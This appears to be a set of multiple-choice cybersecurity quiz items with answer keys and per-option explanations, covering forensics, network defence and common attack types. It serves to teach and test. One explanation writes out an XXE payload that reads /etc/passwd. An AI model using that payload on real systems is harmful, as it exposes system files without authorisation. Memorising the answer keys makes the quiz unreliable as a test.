  {id:751,domain:O,question:"What is a chain of custody in digital forensics?",options:["The order in which servers are patched","A documented, unbroken record of evidence handling — who collected it, when, how it was stored, and who accessed it — ensuring evidence integrity and admissibility in legal proceedings","A chain used to physically secure evidence lockers","The hierarchy of incident response team members"],answer:1,explanation:"Chain of custody documentation (timestamps, signatures, hash values at each transfer) proves evidence wasn't tampered with — a broken chain of custody can get digital evidence thrown out of court even if the evidence itself clearly shows wrongdoing.",optionExplanations:["Patching order is unrelated to forensic evidence handling.","Chain of custody is critical for legal admissibility — any gap or unexplained access raises doubt about whether evidence was altered, potentially invalidating an otherwise solid case.","Physical chains for evidence lockers are a security control, not the documentation process itself.","Team hierarchy is an organizational structure, distinct from evidence handling documentation."]},
  {id:752,domain:A,question:"What is the purpose of certificate pinning?",options:["Physically pinning certificates to a bulletin board","Hardcoding or 'pinning' the expected certificate or public key for a service within an application, preventing acceptance of fraudulent certificates even if issued by a compromised or rogue CA","Pinning certificate expiration dates", "Requiring a PIN code to access certificates"],answer:1,explanation:"Mobile banking apps often pin their server's certificate — even if an attacker obtains a fraudulent cert from a compromised CA and performs a MITM attack, the app rejects the connection because the certificate doesn't match the pinned value.",optionExplanations:["This describes a physical action, not the technical security control.","Certificate pinning defends against CA compromise and MITM attacks by removing trust in the broader CA ecosystem for a specific app/service — the tradeoff is operational complexity when legitimately rotating certificates.","Expiration management is separate from pinning, which is about which certificate/key is trusted.","Pinning is a software mechanism, not a PIN-based user authentication method."]},
  {id:753,domain:T,question:"What is a watering hole attack?",options:["A physical attack at a water treatment facility","An attack where adversaries compromise a website frequently visited by their intended target group, infecting visitors with malware when they visit the legitimate but compromised site","Flooding a network with water-themed phishing emails","An attack that drains a database dry"],answer:1,explanation:"APT groups research which industry forums, trade association sites, or news sites their target organization's employees frequently visit, then compromise that third-party site to deliver malware — bypassing the target's own perimeter defenses by exploiting trust in a site they already visit.",optionExplanations:["This isn't a physical infrastructure attack on water systems; it's a name from the wildlife predator/prey analogy.","Watering hole attacks exploit the trust relationship between users and frequently-visited legitimate sites, making them effective against well-defended targets who'd be hard to phish directly.","The 'watering hole' name is metaphorical, not related to email content theme.","This isn't about data exfiltration from databases; it's a malware delivery technique via compromised third-party sites."]},
  {id:754,domain:G,question:"What is the principle of non-repudiation in cybersecurity?",options:["The right to deny any accusation","Ensuring that a party cannot deny having performed an action or sent a message, typically achieved through digital signatures and audit logs that provide verifiable proof of origin and integrity","Refusing to repeat a security policy","Disabling repetitive password attempts"],answer:1,explanation:"Digital signatures provide non-repudiation because only the holder of the private key could have created that signature — combined with audit logs and timestamps, this prevents a user from credibly denying they performed a transaction or sent a communication.",optionExplanations:["Non-repudiation is the opposite — it prevents successful denial through cryptographic proof.","Non-repudiation is one of the core security goals (alongside confidentiality, integrity, availability) and is essential for legal/financial transactions where proof of action is required.","This isn't about policy communication; it's about provable accountability for actions.","Account lockout addresses brute force attacks, unrelated to the non-repudiation security principle."]},
  {id:755,domain:O,question:"What is a tabletop exercise in incident response planning?",options:["A physical game played during lunch breaks","A discussion-based simulation where team members walk through their roles and responses to a hypothetical incident scenario without actually executing technical actions, testing plans and communication","Setting up tables for a security conference","An exercise requiring physical equipment on a table"],answer:1,explanation:"Tabletop exercises (e.g., 'a ransomware attack has encrypted the file server — what do you do?') let teams identify gaps in IR plans, unclear roles, and communication breakdowns in a low-stakes setting before a real incident tests the plan under pressure.",optionExplanations:["This is a serious training exercise, not recreational.","Tabletop exercises are a cost-effective way to validate incident response plans and build muscle memory for roles/communication without the cost or risk of a full technical simulation.","This isn't about event logistics; it's an incident response training methodology.","Tabletops are discussion-based, distinguishing them from hands-on technical exercises like live-fire/red team simulations."]},
  {id:756,domain:T,question:"What is a buffer overflow vulnerability?",options:["When a network has too much traffic","A vulnerability where a program writes more data to a buffer than it can hold, overwriting adjacent memory and potentially allowing attackers to execute arbitrary code or crash the application","A vulnerability in cloud storage buffers", "Overfilling a database table"],answer:1,explanation:"Classic buffer overflows overwrite the return address on the stack with attacker-controlled data, redirecting execution to injected shellcode — modern mitigations like ASLR, DEP/NX, and stack canaries make exploitation harder but don't eliminate the vulnerability class.",optionExplanations:["Network traffic congestion is unrelated to memory corruption vulnerabilities.","Buffer overflows exploit insufficient bounds checking in memory-unsafe languages (C/C++) — they remain a significant vulnerability class despite decades of mitigation development, particularly in embedded/legacy systems.","Cloud storage buffering is unrelated; this is a low-level memory corruption vulnerability.","Database overfilling would cause errors/constraint violations, not memory corruption exploitation."]},
  {id:757,domain:A,question:"What is the purpose of network access control (NAC)?",options:["Controlling who can access the network's physical building","A security solution that enforces policy-based control over devices attempting to connect to a network, checking compliance (patches, AV status) before granting access and can quarantine non-compliant devices","Limiting the number of network administrators","Controlling internet bandwidth allocation"],answer:1,explanation:"NAC solutions (Cisco ISE, Aruba ClearPass) check device posture (OS patch level, antivirus status, domain membership) before granting network access — non-compliant devices get placed in a quarantine VLAN with remediation access only, preventing unpatched/infected devices from reaching production networks.",optionExplanations:["This describes physical access control, not network admission control.","NAC enforces security posture requirements at the network admission point, preventing devices that don't meet baseline security standards from accessing sensitive network resources.","Administrator account management is access management, not endpoint posture/admission control.","Bandwidth management is QoS, a separate network function from access control."]},
  {id:758,domain:O,question:"What is a security information event management (SIEM) use case?",options:["A SIEM is only used for storing logs", "A predefined detection scenario or rule set within a SIEM designed to identify a specific type of security event or attack pattern, such as detecting impossible travel or brute force login attempts","A SIEM licensing model","A use case for buying SIEM hardware"],answer:1,explanation:"Example use cases: 'Impossible Travel' (same user logs in from US then China within an hour), 'Brute Force Detection' (5+ failed logins in 5 minutes), 'Privilege Escalation' (standard user added to Domain Admins) — each use case translates a known attack pattern into correlation rules and alerts.",optionExplanations:["Pure storage is log aggregation; use cases are the analytical detection logic built on top.","SIEM use cases operationalize threat detection by codifying known attack patterns and anomalies into specific, actionable correlation rules and alerts that the security team can tune and respond to.","Licensing models are commercial/business terms, not a technical SIEM concept.","Hardware procurement is unrelated to the detection logic concept of a 'use case.'"]},
  {id:759,domain:T,question:"What is a session fixation attack?",options:["Fixing bugs in session management code","An attack where an attacker sets or predicts a victim's session ID before authentication, then hijacks the session once the victim logs in using that known session ID","Repairing broken user sessions","A denial-of-service attack on session servers"],answer:1,explanation:"If an application doesn't regenerate session IDs after login, an attacker can send a victim a link with a pre-set session ID (?PHPSESSID=attackerknown123) — once the victim logs in, the attacker uses that same session ID to access the authenticated session.",optionExplanations:["This is an attack technique, not a development/maintenance activity.","Session fixation exploits applications that accept externally-supplied session identifiers without regenerating them post-authentication — the fix is always issuing a new session ID upon successful login.","This isn't a remediation activity; it's an exploitation technique.","Session fixation is a hijacking technique, not an availability attack."]},
  {id:760,domain:P,question:"What is the role of a Chief Information Security Officer (CISO)?",options:["Managing only the IT helpdesk","The senior executive responsible for establishing and maintaining the enterprise security vision, strategy, and program, aligning security initiatives with business objectives and managing organizational risk","Writing all security code personally","Managing physical building security only"],answer:1,explanation:"The CISO bridges the gap between technical security operations and executive/board-level business strategy — translating technical risk into business risk language, securing budget, and ensuring security supports rather than hinders business objectives.",optionExplanations:["Helpdesk management is operational IT support, far below CISO-level strategic responsibility.","The CISO role is strategic and executive-level, focused on governance, risk management, and aligning the security program with overall business strategy and risk appetite — not day-to-day technical execution.","CISOs are executives setting strategy and policy; they don't typically write code themselves.","Physical security is one component but the CISO role encompasses the entire information security program, both digital and physical."]},
  {id:761,domain:A,question:"What is the function of a reverse proxy?",options:["A proxy that only works backward through time","A server that sits in front of backend servers, forwarding client requests to them and returning responses, often providing load balancing, caching, SSL termination, and security filtering","A proxy that reverses encrypted traffic into plaintext","A proxy used only for outbound internet access"],answer:1,explanation:"Reverse proxies (NGINX, HAProxy) hide backend server details from clients, distribute load across multiple servers, cache static content, terminate SSL/TLS to offload encryption overhead, and can filter malicious requests (WAF functionality) before they reach application servers.",optionExplanations:["This is wordplay; 'reverse' refers to direction relative to a forward proxy, not time.","Reverse proxies sit between clients and servers from the server side, providing centralized security, performance, and availability benefits that would be difficult to implement at each individual backend server.","Reverse proxies don't inherently decrypt traffic for that purpose; SSL termination is a separate, optional function.","Forward proxies serve outbound client requests; reverse proxies serve inbound requests to backend servers — they serve different purposes."]},
  {id:762,domain:T,question:"What is a brute force attack?",options:["A physically forceful attack on a server room","An attack method that systematically attempts all possible password combinations or uses extensive wordlists until the correct credential is found, relying on computational power rather than vulnerability exploitation","Forcefully disconnecting network cables","An attack using physical force to bypass biometric locks"],answer:1,explanation:"Online brute force attacks against login forms are typically slow and noisy (triggering lockouts), while offline brute force against captured password hashes can attempt billions of combinations per second using GPU clusters — strong, unique passwords and proper hashing (bcrypt, Argon2) are the primary defenses.",optionExplanations:["This isn't physical force; it's a computational/algorithmic password-guessing technique.","Brute force attacks rely on trying many possibilities exhaustively, contrasting with attacks that exploit logic flaws or vulnerabilities — defenses include account lockout, rate limiting, and strong adaptive hashing functions.","Cable disconnection would be a physical sabotage/DoS act, unrelated to credential guessing.","This describes a physical biometric bypass technique, not brute force credential guessing."]},
  {id:763,domain:O,question:"What is the purpose of a runbook in security operations?",options:["A book listing all employee work schedules","A documented set of step-by-step procedures for responding to specific, recurring operational events or incidents, enabling consistent and efficient handling, often supporting automation","A physical logbook for tracking server uptime","A book of company financial records"],answer:1,explanation:"A phishing email runbook might specify: 1) Quarantine the email across all mailboxes, 2) Check if any users clicked the link, 3) Reset credentials for affected users, 4) Block the sender domain — having this codified means any analyst can respond consistently, and the steps can often be automated via SOAR platforms.",optionExplanations:["This isn't about staff scheduling; it's about operational incident procedures.","Runbooks standardize response actions for known scenarios, reducing response time variability and human error, and serving as the foundation for security orchestration and automated response (SOAR) playbooks.","Uptime tracking is monitoring, distinct from documented response procedures.","Financial records are unrelated to security operational procedures."]},
  {id:764,domain:A,question:"What is the principle behind a screened subnet (formerly DMZ) architecture?",options:["A subnet that filters out screen content", "A network segment positioned between the internal trusted network and the untrusted internet, hosting public-facing services while isolating them from the internal network if compromised", "A subnet used only for video screens", "A backup subnet for disaster recovery"],answer:1,explanation:"Web servers, mail servers, and DNS servers in a screened subnet are reachable from the internet but have restricted access to internal networks — if a public-facing server is compromised, the attacker still must breach another firewall layer to reach internal systems, limiting blast radius.",optionExplanations:["This is wordplay; 'screened' refers to network filtering, not display screens.","Screened subnets implement defense-in-depth by isolating publicly accessible services from sensitive internal resources, ensuring compromise of an internet-facing system doesn't directly expose the internal network.","This isn't about display technology; it's a network architecture security zone.","DR subnets serve business continuity purposes, a different architectural concern than perimeter security segmentation."]},
  {id:765,domain:T,question:"What is a man-in-the-browser (MITB) attack?",options:["An attack requiring physical access to a browser application","A trojan-based attack that infects a web browser to intercept and manipulate communications between the user and web applications in real time, often used for financial fraud","A browser compatibility testing technique","An attack on browser bookmark synchronization"],answer:1,explanation:"MITB malware (like the Zeus banking trojan) injects malicious code into the browser process itself, allowing it to modify transaction details (e.g., changing the destination account number) after the user enters and confirms data but before it's transmitted — defeating even TLS encryption since the manipulation happens at the application layer inside the browser.",optionExplanations:["MITB doesn't require physical access; it's malware that infects the browser remotely.","MITB attacks operate at the application layer within the browser process, making them effective even against TLS-protected connections since the data is manipulated after decryption but before display/transmission.","This isn't a QA/testing technique; it's malicious browser exploitation.","Bookmark sync is unrelated; MITB targets transaction/communication content within browser sessions."]},
  {id:766,domain:G,question:"What is the purpose of input validation in secure coding?",options:["Validating that input forms are visually appealing","Checking and sanitizing user-supplied data against expected formats, types, lengths, and ranges before processing it, preventing injection attacks and unexpected application behavior","Validating that users have entered their name correctly","Counting the number of form fields"],answer:1,explanation:"Proper input validation (allowlisting expected characters/formats rather than blocklisting known-bad patterns) is the first line of defense against SQL injection, XSS, command injection, and buffer overflows — it should be performed server-side since client-side validation can be bypassed.",optionExplanations:["Visual design is a UX concern, unrelated to security validation.","Input validation is a fundamental secure coding practice that prevents malicious or malformed data from reaching application logic, databases, or the OS layer where it could cause harm.","Name validation is one narrow example; input validation applies broadly to all untrusted data.","Field counting is a UI concern, not a security validation practice."]},
  {id:767,domain:O,question:"What is the purpose of vulnerability scanning frequency requirements in compliance frameworks?",options:["Scanning is only required once during initial setup","Many compliance frameworks (PCI DSS, etc.) mandate regular vulnerability scans (e.g., quarterly external scans, after significant changes) to ensure newly discovered vulnerabilities and configuration drift are identified promptly","Scanning frequency has no compliance implications","Scans should only run during planned maintenance windows once a year"],answer:1,explanation:"PCI DSS requires quarterly external vulnerability scans by an Approved Scanning Vendor (ASV) plus scans after any significant network change — this regular cadence catches newly disclosed CVEs and configuration drift that a one-time assessment would miss.",optionExplanations:["A single scan becomes outdated quickly as new vulnerabilities are disclosed and configurations change.","Regular scanning cadences are explicitly mandated by frameworks like PCI DSS because the threat landscape and environment both change continuously, requiring ongoing verification rather than point-in-time assessment.","Compliance frameworks specifically define minimum scanning frequencies as audit requirements.","Annual-only scanning would leave long windows where new vulnerabilities go undetected, failing most compliance frequency requirements."]},
  {id:768,domain:T,question:"What is a clickjacking attack?",options:["An attack that steals computer mice", "A UI redress attack where attackers trick users into clicking on something different from what they perceive, often using transparent or disguised overlay frames to hijack clicks for unintended actions", "A method for tracking ad clicks","An attack that disables mouse clicking"],answer:1,explanation:"An attacker overlays an invisible iframe of a legitimate page (e.g., a 'delete my account' or 'transfer funds' button) on top of an enticing decoy page — the user thinks they're clicking the decoy but actually clicks the hidden legitimate control, performing an unintended action.",optionExplanations:["This isn't about hardware theft; it's a UI manipulation web attack.","Clickjacking exploits how browsers render overlapping/transparent content, tricking users into performing actions they didn't intend — defenses include X-Frame-Options headers and frame-busting scripts.","Ad click tracking is a legitimate analytics function, unrelated to this malicious UI deception technique.","This doesn't disable clicking; it redirects the intent/target of legitimate clicks."]},
  {id:769,domain:A,question:"What is the purpose of a Trusted Platform Module (TPM)?",options:["A trusted software application for managing passwords","A dedicated hardware chip that securely generates, stores, and manages cryptographic keys, providing hardware-based security functions like secure boot verification and disk encryption key protection","A trusted list of approved software vendors","A module that monitors network traffic for trust violations"],answer:1,explanation:"TPM chips store the encryption keys used by BitLocker/FileVault in hardware isolated from the OS, perform secure boot integrity measurements (detecting bootkit/rootkit tampering), and resist extraction even with physical access — Windows 11 requires TPM 2.0 partly for this hardware-rooted security.",optionExplanations:["TPM is a hardware chip, not a software application.","TPM provides a hardware root of trust that's significantly more resistant to tampering and key extraction than software-only key storage, underpinning features like secure boot and full-disk encryption key protection.","This isn't a vendor allowlist; TPM is a cryptographic hardware security module.","Network traffic monitoring is a different security function from TPM's cryptographic key management role."]},
  {id:770,domain:P,question:"What is the purpose of a security control matrix or crosswalk?",options:["A physical matrix display in the SOC","A document mapping security controls across multiple frameworks or standards (e.g., NIST 800-53 to ISO 27001) to show equivalencies, simplifying compliance with multiple overlapping requirements","A matrix for tracking employee performance reviews","A network topology diagram"],answer:1,explanation:"Organizations subject to multiple frameworks (e.g., a healthcare company needing HIPAA and PCI DSS compliance) use crosswalks to identify where a single implemented control satisfies requirements across frameworks, avoiding duplicate work and demonstrating comprehensive compliance efficiently.",optionExplanations:["This isn't physical hardware; it's a documentation/mapping tool.","Control crosswalks/matrices reduce compliance overhead by identifying overlap between frameworks, letting organizations implement once and map to multiple regulatory or standards requirements.","Performance reviews are HR functions, unrelated to compliance control mapping.","Network diagrams show infrastructure topology, a different artifact from compliance control mapping."]},
  {id:771,domain:T,question:"What is a fileless malware attack?",options:["Malware that doesn't require any storage space","Malicious activity that operates primarily in memory, using legitimate system tools (like PowerShell or WMI) rather than writing executable files to disk, making it harder to detect with traditional file-based antivirus","Malware specifically targeting cloud file storage","An attack that deletes all files on a system"],answer:1,explanation:"Fileless malware leverages 'living off the land' techniques — using PowerShell, WMI, or registry-based persistence — to execute malicious code entirely in memory, evading signature-based AV that scans files on disk, and often disappearing after a reboot, complicating forensic analysis.",optionExplanations:["Fileless doesn't mean zero storage usage; it means avoiding traditional executable files to evade file-based detection.","Fileless techniques exploit trust in legitimate, signed system binaries (LOLBins) to execute malicious logic without ever writing a detectable malicious file, requiring behavioral/memory-based detection (EDR) rather than signature scanning.","Cloud file storage targeting describes a different attack category, not the fileless execution technique.","Fileless malware doesn't necessarily delete files; the term refers to its own execution method, not its payload behavior."]},
  {id:772,domain:O,question:"What is the purpose of a Security Orchestration, Automation, and Response (SOAR) platform?",options:["A platform for managing physical security guards' schedules","A platform that integrates security tools, automates repetitive response tasks via playbooks, and orchestrates workflows across the security stack to speed up incident response and reduce analyst workload","A platform for orchestral music used in SOC ambiance","A platform exclusively for vulnerability scanning"],answer:1,explanation:"SOAR platforms (Splunk SOAR, Palo Alto XSOAR) connect to SIEM, EDR, firewalls, and ticketing systems, executing automated playbooks (e.g., automatically isolating an infected host, blocking a malicious IP across all firewalls, and opening a ticket) in seconds rather than the minutes/hours manual response would take.",optionExplanations:["This isn't about physical guard scheduling; SOAR is a technical security operations tool.","SOAR addresses analyst fatigue and response time by automating well-understood, repetitive tasks, freeing analysts to focus on complex investigation and decision-making for novel threats.","This is wordplay; SOAR has nothing to do with music.","Vulnerability scanning is one possible integration but SOAR's core function is broader orchestration and automated response across the security toolchain."]},
  {id:773,domain:A,question:"What is the difference between full disk encryption (FDE) and file-level encryption?",options:["There is no meaningful difference","FDE encrypts an entire storage volume including the OS, applications, and all files as a single unit, while file-level encryption selectively encrypts individual files or folders, allowing more granular access control","File-level encryption is always faster than FDE","FDE only works on solid-state drives"],answer:1,explanation:"FDE (BitLocker, FileVault) protects data at rest if a device is lost/stolen since the entire drive is unreadable without the decryption key, but offers no protection once the OS is running and the user is authenticated — file-level encryption can keep specific sensitive files protected even from other authenticated users on the same system.",optionExplanations:["These are distinct approaches with different security properties, performance characteristics, and use cases.","FDE provides device-loss protection (encrypting everything at the volume level), while file-level encryption provides granular, persistent protection for specific sensitive data even during normal system operation by other users.","Performance varies by implementation; FDE with hardware acceleration can often outperform software file-level encryption.","FDE works on both HDDs and SSDs, though SSD-specific considerations like wear-leveling and TRIM exist."]},
  {id:774,domain:T,question:"What is a credential stuffing attack?",options:["Forcing too many credentials into a single login form field","An automated attack using lists of previously breached username/password pairs (often from unrelated breaches) to attempt logins on other services, exploiting password reuse across sites","Stuffing a server with fake credentials to confuse attackers","An attack that physically overloads authentication servers"],answer:1,explanation:"Because many users reuse passwords across services, attackers take credentials leaked in one breach (e.g., a gaming site) and test them en masse against unrelated high-value targets (banking, email) using automated tools — MFA and breached-password screening (checking against Have I Been Pwned-style databases) are key defenses.",optionExplanations:["This isn't about form field overflow; it's automated credential reuse testing across services.","Credential stuffing succeeds specifically because of widespread password reuse — defenses include MFA, CAPTCHA, rate limiting, and proactively checking new passwords against known breach databases.","This isn't a defensive deception technique; it's a real automated attack against authentication systems.","This is an automated login attempt attack, not a physical resource exhaustion attack."]},
  {id:775,domain:G,question:"What is the purpose of separation of duties as a security control?",options:["Physically separating employees into different buildings","Dividing critical tasks or responsibilities among multiple individuals so that no single person can complete a sensitive process alone, reducing fraud and error risk","Separating IT staff by their preferred programming languages","Requiring employees to take separate lunch breaks"],answer:1,explanation:"Example: the person who requests a wire transfer cannot also approve it, and the person who approves it cannot also execute it — this requires collusion between multiple people to commit fraud, significantly raising the difficulty and detection likelihood compared to a single insider acting alone.",optionExplanations:["Physical building separation isn't the mechanism; it's about dividing process responsibilities, regardless of location.","Separation of duties is a foundational fraud-prevention control, ensuring critical or sensitive processes require multiple people, making unilateral malicious or erroneous action much harder.","Programming language preference is irrelevant to this security control concept.","Lunch scheduling is unrelated to separation of duties in critical business processes."]},
  {id:776,domain:O,question:"What is a security baseline configuration?",options:["The lowest acceptable security budget","A documented, standardized minimum security configuration for a system or device type, against which deployed systems are compared to detect unauthorized changes or configuration drift","A baseline measurement of network bandwidth","An initial password set during system installation"],answer:1,explanation:"Security baselines (CIS Benchmarks, DISA STIGs) define settings like disabled unnecessary services, required password policies, and audit logging configuration — automated tools (SCAP scanners) regularly check deployed systems against the baseline, flagging any drift for remediation.",optionExplanations:["Budget is a financial concept, unrelated to technical configuration standards.","Baselines establish the expected secure state for systems, enabling automated drift detection and ensuring consistency across an organization's fleet of similar systems.","Bandwidth measurement is network performance monitoring, a different concept from configuration security baselines.","Initial passwords are one setting among many; baselines comprehensively define the full secure configuration state."]},
  {id:777,domain:T,question:"What is an evil twin attack?",options:["An attack performed by two coordinated attackers", "A rogue wireless access point set up to mimic a legitimate network's SSID, tricking users into connecting so the attacker can intercept their traffic","A malware variant that creates a duplicate of itself","An attack targeting backup/twin data centers"],answer:1,explanation:"An attacker sets up an AP broadcasting the same SSID as a legitimate network (e.g., 'Airport_WiFi') often with a stronger signal — victims' devices auto-connect to the familiar name, allowing the attacker to perform MITM attacks, capture credentials, or serve malicious content.",optionExplanations:["'Evil twin' refers to the rogue AP mimicking the legitimate one, not coordinated human attackers.","Evil twin attacks exploit user trust in familiar network names (SSIDs) and devices' tendency to auto-connect to previously known networks, enabling traffic interception without the victim's awareness.","This is a wireless network attack, not malware self-replication.","This targets wireless client devices, not redundant data center infrastructure."]},
  {id:778,domain:A,question:"What is the purpose of micro-segmentation in a data center network?",options:["Using smaller network cables","Creating granular security zones around individual workloads or applications (often within a single VLAN/subnet), enforcing strict policy-based communication rules between them, typically used in zero trust architectures","Dividing a data center into smaller physical buildings","Reducing the number of servers in a data center"],answer:1,explanation:"Unlike traditional VLAN segmentation which creates broad zones, micro-segmentation (using tools like VMware NSX or Illumio) can restrict communication down to the individual VM/container level — even systems on the same subnet must have explicit policy permission to communicate, dramatically limiting lateral movement if one workload is compromised.",optionExplanations:["Cable size is a physical layer concern unrelated to logical network segmentation.","Micro-segmentation extends segmentation principles to a much finer granularity than traditional network zones, directly supporting zero trust's 'never trust, always verify' approach by requiring explicit policy for any east-west traffic.","Physical building division is a different (and impractical) concept; micro-segmentation is a logical/software-defined control.","Server consolidation is a capacity/efficiency concern, unrelated to micro-segmentation's security purpose."]},
  {id:779,domain:O,question:"What is the purpose of a post-incident review (lessons learned) meeting?",options:["To assign blame to the team member who caused the incident","A structured review conducted after incident resolution to analyze what happened, evaluate the effectiveness of the response, and identify improvements to processes, tools, or training to prevent recurrence","To celebrate the incident response team's efforts","To immediately close the incident ticket without further analysis"],answer:1,explanation:"Effective lessons-learned meetings follow a blameless post-mortem approach, focusing on systemic and process improvements (e.g., 'why did detection take 6 hours?' leads to better alerting) rather than individual blame, which encourages honest disclosure of mistakes that improves future response.",optionExplanations:["Blameless post-mortems are the recommended practice specifically because blame culture suppresses honest reporting and learning.","Lessons-learned reviews are a critical feedback loop in the incident response lifecycle (NIST's IR process explicitly includes this phase), turning each incident into an opportunity to strengthen defenses and response capability.","While team recognition can be positive, the primary purpose is analytical improvement, not celebration.","Skipping analysis would forfeit the value of the incident as a learning opportunity, contrary to IR best practice."]},
  {id:780,domain:T,question:"What is the purpose of a logic bomb?",options:["A bomb threat made via a phone system","Malicious code intentionally inserted into a system that lies dormant until triggered by a specific condition (date, event, or action), at which point it executes a harmful payload","A type of brute-force password cracking tool","An attack that physically destroys network hardware"],answer:1,explanation:"A classic example: a disgruntled employee plants code that deletes critical database tables if their employee ID is removed from the payroll system (indicating termination) — logic bombs are particularly dangerous insider threats because they can remain undetected for long periods before triggering.",optionExplanations:["This is a software-based attack technique, not a physical threat or communication.","Logic bombs are characterized by their conditional trigger and dormancy — they're frequently associated with insider threats who have legitimate code access and can embed the malicious logic into systems they're trusted to maintain.","This isn't a password cracking technique; it's a dormant, conditionally-triggered malicious code payload.","Logic bombs are software attacks against data/systems, not physical hardware destruction (though some could trigger physical damage indirectly, that's not the defining characteristic)."]},
  {id:781,domain:G,question:"What is the purpose of a security awareness training program?",options:["Training only the IT security team on new tools","An ongoing program educating all employees about security threats (phishing, social engineering, safe data handling) and organizational policies, reducing human-factor risk which is a leading cause of breaches","A one-time training given only during new hire onboarding","Training employees exclusively on physical fire safety"],answer:1,explanation:"Since human error and social engineering are involved in the majority of breaches, ongoing security awareness training (phishing simulations, periodic refreshers, role-based training) is one of the highest-ROI security investments — a single onboarding session is quickly forgotten without reinforcement.",optionExplanations:["Awareness training targets all employees since everyone is a potential attack vector (phishing, social engineering), not just security specialists.","Continuous, organization-wide training directly addresses the human element, which remains one of the most exploited attack vectors despite technical controls.","One-time onboarding training has limited long-term retention; effective programs require ongoing reinforcement (e.g., quarterly phishing simulations).","Fire safety is physical safety training, a separate topic from cybersecurity awareness."]},
  {id:782,domain:O,question:"What is the purpose of a digital forensic disk image (bit-for-bit copy)?",options:["A photograph of the physical hard drive","An exact, sector-by-sector duplicate of a storage device, including deleted files, slack space, and unallocated space, preserving the original evidence in an unaltered state for examination","A compressed backup of only active files","A summary report of disk usage statistics"],answer:1,explanation:"Forensic imaging tools (FTK Imager, dd) create a verified (hash-matched) bit-for-bit copy so investigators can analyze a working copy while the original remains pristine and unaltered — write blockers are used during imaging to prevent any modification to the source device, preserving evidentiary integrity.",optionExplanations:["This isn't a literal photograph; it's a data-level exact duplication.","Bit-for-bit imaging captures everything including deleted/recoverable data and unallocated space, which standard file backups would miss, and preserves original evidence integrity for legal admissibility.","Active-file-only backups would miss deleted file remnants and forensic artifacts that are often critical to an investigation.","A usage summary report lacks the actual data needed for detailed forensic examination."]},
  {id:783,domain:T,question:"What is an XML External Entity (XXE) injection attack?",options:["An attack that injects XML formatting errors","An attack exploiting vulnerable XML parsers that process external entity references, potentially allowing attackers to read local files, perform SSRF, or cause denial of service","An attack that converts XML files to JSON maliciously","A network attack targeting XML-based routing protocols"],answer:1,explanation:"Vulnerable XML parsers that process DOCTYPE declarations with external entities can be exploited with payloads like <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to read arbitrary local files, or to make the server perform SSRF requests to internal systems — disabling external entity processing in the parser is the primary defense.",optionExplanations:["This isn't about formatting errors; it's a parser vulnerability allowing malicious entity resolution.","XXE specifically abuses the XML standard's external entity feature, which many parsers process by default — leading to file disclosure, SSRF, or DoS if not explicitly disabled.","Format conversion is unrelated; XXE exploits parsing behavior, not data transformation.","This is an application-layer vulnerability in XML processing, not a network routing protocol attack."]},
  {id:784,domain:A,question:"What is the function of an Intrusion Prevention System (IPS) compared to an IDS?",options:["IPS and IDS are identical technologies with different names","An IPS actively blocks or prevents detected malicious traffic in real time (inline), while an IDS only detects and alerts on suspicious activity without taking automatic blocking action","IPS only works on wireless networks while IDS works on wired networks","IDS is always more accurate than IPS"],answer:1,explanation:"IDS is deployed out-of-band (monitoring a copy of traffic via a SPAN/mirror port), so it can alert but not block in real time, while IPS is deployed inline (directly in the traffic path), allowing it to drop malicious packets immediately — the tradeoff is that IPS false positives can disrupt legitimate traffic, while IDS false positives are just noisy alerts.",optionExplanations:["IDS and IPS differ fundamentally in deployment (out-of-band vs inline) and response capability (alert-only vs active blocking).","The key distinction is active prevention (inline blocking) versus passive detection (alerting only) — many products now offer both modes (IDS/IPS) configurable per deployment need.","Both technologies can be deployed on wired or wireless networks; the distinction is about response action, not network medium.","Accuracy depends on tuning and detection method, not which mode (IDS vs IPS) is used — both face the same detection accuracy challenges."]},
  {id:785,domain:P,question:"What is the purpose of a data retention policy?",options:["A policy ensuring data is never deleted","A policy defining how long different types of data must be kept and when it should be securely destroyed, balancing legal/regulatory requirements, business needs, and risk reduction from holding unnecessary data","A policy for backing up data daily","A policy restricting who can create new data"],answer:1,explanation:"Data retention policies specify, for example, that financial records must be kept 7 years (tax requirements) while old marketing emails can be deleted after 90 days — minimizing unnecessarily retained data reduces breach impact (less data to steal) and reduces storage/compliance costs, while still meeting legal hold requirements.",optionExplanations:["Retention policies specifically define when data SHOULD be deleted, not indefinite retention, which itself increases risk and storage costs.","Effective retention policies balance competing needs: legal/regulatory minimums, business utility, and the security principle of minimizing data exposure by not retaining what's no longer needed.","Backup frequency is an operational/availability concern, distinct from how long data should ultimately be retained or destroyed.","Retention policies govern data lifecycle/destruction, not data creation access permissions."]},
  {id:786,domain:T,question:"What is a race condition vulnerability?",options:["A vulnerability that only affects racing/gaming applications","A flaw occurring when the outcome of a process depends on the timing or sequence of uncontrollable events, which an attacker can exploit by manipulating timing to cause unintended behavior, such as Time-of-Check to Time-of-Use (TOCTOU) issues","A vulnerability causing systems to run faster than intended","An attack that races to crack passwords before lockout"],answer:1,explanation:"TOCTOU race conditions occur when a security check (e.g., verifying file permissions) and the actual use of that resource happen at different times — an attacker can swap the resource between the check and use (e.g., replacing a validated file with a malicious symlink) to bypass the security control.",optionExplanations:["This is a generic software vulnerability class, not specific to gaming applications despite the name.","Race conditions exploit the gap between when a condition is checked and when it's acted upon, allowing attackers to manipulate system state in that window — careful use of atomic operations and locking mechanisms prevents this.","Race conditions are about timing-dependent vulnerabilities, not literal execution speed increases.","This isn't about competing with lockout timers; it's about exploiting timing gaps in security checks within software logic."]},
  {id:787,domain:O,question:"What is a key performance indicator (KPI) used to measure SOC effectiveness?",options:["The number of coffee breaks taken by analysts","Metrics such as Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR), which measure how quickly a SOC identifies and responds to security incidents, indicating operational efficiency","The total number of firewalls deployed","The number of employees in the organization"],answer:1,explanation:"MTTD (time from compromise to detection) and MTTR (time from detection to containment/resolution) are industry-standard SOC metrics — reducing these numbers through better tooling, automation, and process directly correlates with reduced breach impact and cost, since dwell time strongly influences damage extent.",optionExplanations:["This is unrelated to operational security performance measurement.","MTTD and MTTR are widely recognized as the most meaningful SOC performance metrics because they directly measure the speed of the detection-to-response pipeline, which correlates strongly with breach impact.","Firewall count is an infrastructure inventory metric, not a measure of SOC operational effectiveness.","Headcount is an organizational metric unrelated to demonstrating SOC detection/response capability."]},
